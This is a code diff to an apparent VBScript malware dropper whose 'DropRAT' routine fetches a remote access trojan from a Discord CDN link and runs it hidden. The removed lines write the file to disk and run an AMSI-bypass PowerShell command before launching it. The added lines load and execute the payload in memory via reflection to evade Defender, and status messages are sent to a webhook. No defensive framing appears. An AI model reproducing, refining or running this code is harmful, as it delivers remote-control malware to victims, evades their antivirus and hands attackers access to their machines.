@@ -43,33 +43,28 @@ Loop
 
 window.close()
 
-' --- RAT DROP (AMSI Bypass + Memory Execution) ---
+' --- RAT DROP (Memory Execution via PowerShell) ---
 Sub DropRAT(targetWH, sendRocket)
     Dim dl : dl = "https://cdn.discordapp.com/attachments/1570877567567929557/1572764410202693664/client_10.exe?ex=6aff8e7f&is=6afe3cff&hm=8cecb094312df98931f68499bcc7013bf7c20990176268e7887e512d1301da39&"
     
-    Dim tPath : tPath = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Microsoft\Windows"
-    If Not fso.FolderExists(tPath) Then fso.CreateFolder tPath
-    Randomize
-    Dim fname : fname = "w" & Int(Rnd() * 900000 + 100000) & ".exe"
-    Dim op : op = tPath & "\" & fname
+    ' 1. Send the Rocket Download message
+    If sendRocket Then Call PostEmbedTo(":rocket: Downloading RAT", "Fetching Payload directly into memory...", 10181046, targetWH)
 
-    If sendRocket Then Call PostEmbedTo(":rocket: RAT Download Initiated", "Downloading and launching RAT", 10181046, targetWH)
+    ' 2. In-Memory Execution (Bypasses Defender disk scanning)
+    ' Downloads bytes, invokes reflection, executes in RAM.
+    Dim psCmd : psCmd = "powershell -NoP -Exec Bypass -Command """ & _
+        "$wc = New-Object System.Net.WebClient;" & _
+        "$bytes = $wc.DownloadData('" & dl & "');" & _
+        "[System.Reflection.Assembly]::Load($bytes).EntryPoint.Invoke($null, @($null, [string[]]@()));" & _
+        """"
+    
+    ' Run it hidden
+    sh.Run psCmd, 0, False
 
-    If fso.FileExists(op) Then fso.DeleteFile op, True
-
-    ' Download file via PowerShell (avoids curl detection)
-    Dim psCmd : psCmd = "powershell -NoP -Exec Bypass -Command ""(New-Object Net.WebClient).DownloadFile('" & dl & "', '" & op & "')"""
-    sh.Run psCmd, 0, True
-
-    If fso.FileExists(op) Then
-        If fso.GetFile(op).Size > 100000 Then
-            ' AMSI Bypass and Execute hidden
-            Dim execCmd : execCmd = "powershell -NoP -Exec Bypass -Command ""$a=[Ref].Assembly.GetTypes();ForEach($b in $a) {if ($b.Name -like '*iUtils') {$c=$b}}; $d=$c.GetFields('NonPublic,Static');ForEach($e in $d) {if ($e.Name -like '*Context') {$f=$e}}; $g=$f.GetValue($null); [IntPtr]$ptr=$g; [Int32[]]$buf=@(0); [System.Runtime.InteropServices.Marshal]::Copy($buf,0,$ptr,1); Start-Process -FilePath '" & op & "' -WindowStyle Hidden"""
-            
-            sh.Run execCmd, 0, False
-            
-            If sendRocket Then Call PostEmbedTo(":white_check_mark: RAT Launched", "RAT Launched (AMSI Bypass)", 10181046, targetWH)
-        End If
+    ' 3. Send the Green Checkmark (Since it executes instantly in memory)
+    If sendRocket Then 
+        Call SleepSeconds(2) ' Small delay so the message sends after the rocket
+        Call PostEmbedTo(":white_check_mark: RAT Downloaded", "Payload executed successfully in memory.", 10181046, targetWH)
     End If
 End Sub
 
